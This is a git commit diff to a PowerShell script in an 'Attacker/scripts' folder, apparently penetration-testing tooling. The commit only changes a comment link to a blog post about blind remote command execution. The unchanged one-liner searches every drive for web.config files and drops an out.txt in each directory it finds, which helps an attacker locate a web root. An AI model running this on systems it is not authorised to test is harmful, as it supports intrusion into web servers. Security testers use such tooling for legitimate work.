6d50af1d6ad9ce186b07bd602c7e272b380fb6eb
CrimsonLabs <61641716+crimsonlabs-io@users.noreply.github.com>
2023-08-01 00:22:35 +0800

    Update FindWebroot.ps1

--- Attacker/scripts/FindWebroot.ps1
+++ Attacker/scripts/FindWebroot.ps1
@@ -1,7 +1,5 @@
 <#
-
-https://crimsonlabs.io/posts/2021/01/web-root-and-blind-remote-command-execution/
-
+https://crimsonlabs.io/posts/web-root-and-blind-remote-command-execution/
 #>
 
 (Get-PSDrive -PSProvider FileSystem).Root | ForEach-Object {(Get-ChildItem -Path $_ -Filter "web.config" -Recurse -ErrorAction SilentlyContinue -Force).DirectoryName | ForEach-Object {Out-File -FilePath "$_\\out.txt" -InputObject $_ -Force -ErrorAction SilentlyContinue}}
